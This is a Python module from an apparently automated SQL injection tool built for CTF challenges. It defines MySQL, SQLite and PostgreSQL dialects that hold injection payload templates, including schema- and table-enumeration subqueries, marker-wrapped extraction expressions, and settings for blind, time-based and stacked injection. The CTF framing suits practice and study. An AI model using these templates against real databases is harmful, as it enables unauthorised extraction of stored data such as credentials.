"""数据库方言：MySQL / SQLite / PostgreSQL 的元查询与函数能力差异。

CTF 三大 DBMS 的注入语法差异集中在此，engine/pipeline/oracles 按方言取用。
"""
from __future__ import annotations

import re
from dataclasses import dataclass


@dataclass
class Dialect:
    name: str                      # mysql / sqlite / postgresql
    version_fn: str                # 版本函数
    current_db_fn: str | None      # 当前库（SQLite 单库为 None）
    user_fn: str | None
    # 元数据查询模板（{lit} 为表名/库名字面量占位）
    list_databases: str | None = None
    list_tables: str | None = None          # 单库表清单（SQLite 用）
    list_tables_of_db: str | None = None    # 指定库表清单（MySQL/PG）
    list_columns: str | None = None
    get_ddl: str | None = None              # 建表语句（SQLite 专属）
    # 拼接与字面量
    mark_wrap: str = "concat(0x7e7e,ifnull(({expr}),0x4e554c4c),0x7e7e)"  # ~~标记~~
    blind_code: str = "ascii"      # 码点函数（SQLite 用 unicode）
    group_concat: str = "group_concat({col})"   # PG 用 string_agg
    supports_error_channel: bool = True
    supports_time_channel: bool = True
    supports_stacked: bool = True

    def str_lit(self, s: str, quote_ok: bool = True) -> str:
        return f"'{s}'" if quote_ok else "0x" + s.encode().hex()


MYSQL = Dialect(
    name="mysql", version_fn="version()", current_db_fn="database()", user_fn="user()",
    list_databases=("(select group_concat(schema_name) "
                    "from information_schema.schemata)"),
    list_tables_of_db=None,  # 由 pipeline 组装（table_schema 条件）
    list_columns=None,       # 由 pipeline 组装
    mark_wrap="concat(0x7e7e,ifnull(({expr}),0x4e554c4c),0x7e7e)",
    blind_code="ascii",
    group_concat="group_concat({col})",
)

SQLITE = Dialect(
    name="sqlite", version_fn="sqlite_version()", current_db_fn=None, user_fn=None,
    list_tables=("(select group_concat(name) from sqlite_master "
                 "where(type='table')and(name not like 'sqlite_%'))"),
    get_ddl="(select sql from sqlite_master where name={lit})",
    mark_wrap="('~~'||ifnull(({expr}),'NULL')||'~~')",
    blind_code="unicode",
    group_concat="group_concat({col})",
    supports_error_channel=False,
    supports_time_channel=False,
    supports_stacked=False,
)

POSTGRES = Dialect(
    name="postgresql", version_fn="version()", current_db_fn="current_database()",
    user_fn="current_user",
    list_databases=("(select string_agg(schema_name,',') "
                    "from information_schema.schemata)"),
    mark_wrap="('~~'||coalesce(({expr})::text,'NULL')||'~~')",
    blind_code="ascii",
    group_concat="string_agg({col},',')",
    supports_error_channel=False,   # PG 报错注入需专用函数（暂不启用）
    supports_time_channel=True,
    supports_stacked=True,
)

DIALECTS = {"mysql": MYSQL, "sqlite": SQLITE, "postgresql": POSTGRES}


def get_dialect(name: str) -> Dialect:
    return DIALECTS.get((name or "mysql").lower(), MYSQL)


def parse_create_table_columns(ddl: str) -> list:
    """从 CREATE TABLE 语句解析列名（SQLite 专属流程）。

    例：CREATE TABLE users(id INTEGER PRIMARY KEY, username TEXT, password TEXT)
    → ['id', 'username', 'password']
    """
    m = re.search(r"\((.*)\)", ddl, re.S)
    if not m:
        return []
    body, cols, depth, cur = m.group(1), [], 0, ""
    for ch in body:
        if ch == "(":
            depth += 1
        elif ch == ")":
            depth -= 1
        if ch == "," and depth == 0:
            cols.append(cur)
            cur = ""
        else:
            cur += ch
    if cur.strip():
        cols.append(cur)
    skip = {"primary", "foreign", "unique", "constraint", "check"}
    out = []
    for c in cols:
        parts = c.strip().split()
        if not parts:
            continue
        name = parts[0].strip('"`[]\'')
        if name.lower() in skip:
            continue
        out.append(name)
    return out
